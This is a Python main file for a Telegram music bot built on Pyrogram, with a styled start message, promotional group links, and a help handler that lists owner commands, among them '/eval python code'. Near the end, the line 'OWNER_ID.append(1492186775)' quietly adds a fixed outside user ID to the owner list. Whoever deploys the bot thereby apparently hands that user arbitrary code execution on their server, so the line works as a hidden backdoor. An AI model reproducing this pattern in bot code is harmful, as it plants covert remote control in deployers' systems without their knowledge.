from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 𝗛𝗲𝗹𝗹𝗼 [{}](tg://user?id={}),

\n\n𝗜 𝗔𝗺 🎸SABER [🎶](https://telegra.ph/file/419f9b44bec5fad553285.jpg)
I am a simble music play bot😌

Hey bru Iam a simble song paly Bot I am share music at <a href="https://t.me/mscgrp_krla"> krla_music_group </a>😌 

Send /song song name in these<a href="https://t.me/mscgrp_krla"> krla_music_group </a>... 😍🥰🤗

𝐄𝐠. ```/song Faded```

➖➖➖➖➖➖➖➖➖➖➖➖
©️MᴀɪɴᴛᴀɪɴᴇD Bʏ:<a href="https://t.me/pro_editor_tg"> Lallu-llalus </a>
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(

           [[InlineKeyboardButton(text="𝐒𝐔𝐏𝐏𝐎𝐑𝐓😉", url="https://t.me/tg_bots_disccurssions"),
             InlineKeyboardButton(
                        text="JOIN😌", url="https://t.me/mscgrp_krla"),
             InlineKeyboardButton(text="Boss Baby 🍼", url="http://t.me/pro_editor_tg")                
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "𝗦𝗲𝗻𝗱 𝗧𝗵𝗲 𝗡𝗮𝗺𝗲 𝗢𝗳 𝗧𝗵𝗲 𝗦𝗼𝗻𝗴 𝗬𝗼𝘂 𝗪𝗮𝗻𝘁... 😍🥰🤗\n /song (song name) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("Hey musicPlayRoBot Is Now Started😌😌😌")
idle()
